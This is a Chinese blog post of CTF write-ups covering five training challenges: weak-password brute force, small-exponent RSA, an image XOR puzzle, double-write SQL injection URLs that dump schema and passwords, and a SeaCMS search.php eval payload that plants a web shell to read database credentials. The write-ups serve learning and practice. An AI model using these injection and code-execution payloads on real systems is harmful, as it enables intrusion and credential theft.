---
title: 赛wp2
date: 2024-06-11
categories:
  - 学习笔记
tags:
  - 初学者
  - 日记
---

  



##   实训题（2025）(回忆版没截图)

### 0X01

**机器人**

->> 开局一个登录框

尝试账号admin 发现密码错误 尝试账号123123 发现账号错误 因此admin账号是正确的

尝试sql注入 万能密码1'or'1'='1 以及其他随便找的可能的注入 无果

访问/robots.txt 发现/secret 是一个弱口令字典

保存进txt 打开burpsuite 弱口令爆破

成功flag

### 0X02

**简单RSA**

可以上脚本一把梭哈

```
import gmpy2
from Crypto.Util.number import long_to_bytes
def small_exponent_attack(n, e, c):
    # 使用 GMPY2 库进行大整数计算
    # 尝试求解密文的 e 次方根
    m = gmpy2.iroot(c, e)[0]
    
    # 如果明文 m 的 e 次方等于密文 c，则成功找到明文
    if pow(m, e, n) == c:
        return m
    else:
        return None

def main():
    # 给定参数
    n = 11202402478656345987154212903027662027017538685714428414851415161128957649579889624097845428050614674223429413493115994386322543186138223717850675020752169942732956426176472885925028766558205408305089614383497481232076799084165695727362275842423382201533733014061419650630359887977443386336820758769032463177072269195492232544478119702273135087721947795235143004642572829727324817228271257227813960708961621442463483533783070127572940368705247876561903513698454549396262257105391361111183179935362032902146865412347121731104129232501666511935321820005788300305968516523690300231550783889650193869762921165994192404809
    e = 3
    c = 3354246622807693497814376144402995120375333350699217397420707331429234099676863720927523159245606048108123789384738710841120280209456235893225846884453
    
    # 尝试进行小指数攻击
    plaintext = small_exponent_attack(n, e, c)
    if plaintext is not None:
        print("明文为:", plaintext)
    else:
        print("无法解密")
    print(long_to_bytes(plaintext))
if __name__ == "__main__":
    main()
```

### 0X03

**听说国际象棋有助于走迷宫哦**

注意到似乎是个二维码 但是二维的不是很码

根据标题指示 构造国际象棋棋盘 无果

根据图片大小（580 × 580） 放大缩小棋盘 最后猜想为29*29 与原图片异或得到结果

```
from PIL import Image, ImageDraw

# 创建一个空白的白色图像
image = Image.new('RGB', (580, 580), color='white')
draw = ImageDraw.Draw(image)

# 定义每个小方格的大小
square_size = 580 // 29  # 使用29x29的棋盘

# 绘制棋盘
for i in range(29):
    for j in range(29):
        x0, y0 = i * square_size, j * square_size
        x1, y1 = x0 + square_size, y0 + square_size
        if (i + j) % 2 == 0:
            draw.rectangle([x0, y0, x1, y1], fill="white")
        else:
            draw.rectangle([x0, y0, x1, y1], fill="black")

# 保存图像为PNG文件
image.save('chessboard_29x29.png')
```

### 0X04

**原题是【极客大挑战-babysql】**

1. 发现from union select 这些关键函数都被替换为空

2. 我是想着试试双写绕过

不懂双写的可以看这篇文章[SQL注入学习笔记（二）_sql注入双写绕过-CSDN博客](https://blog.csdn.net/weixin_68491709/article/details/142327883)

1. ```
   http://714be2fb-b39b-488b-83f2-f8ec05927586.node3.buuoj.cn/check.php?username=admin&password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23
   ```

   发现可以爆出表

2. 查询列名

   ```
   http://714be2fb-b39b-488b-83f2-f8ec05927586.node3.buuoj.cn/check.php?username=admin&password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23
   ```

3. 查询字段名

   ```
   http://714be2fb-b39b-488b-83f2-f8ec05927586.node3.buuoj.cn/check.php?username=admin&password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23
   ```

   ### 0X05

   **百度杯”CTF比赛 九月场 test**

通过插件，查到信息为海洋cms，构造了url>>/search.php?searchtype=5&tid=&area=eval($_POST[1])

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250812134915796.webp)

蛋是！翻了底朝天没看到flag

but，看到 /var/www/html/data/common.inc.php，有数据库信息

那还说啥了

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250812135049291.webp)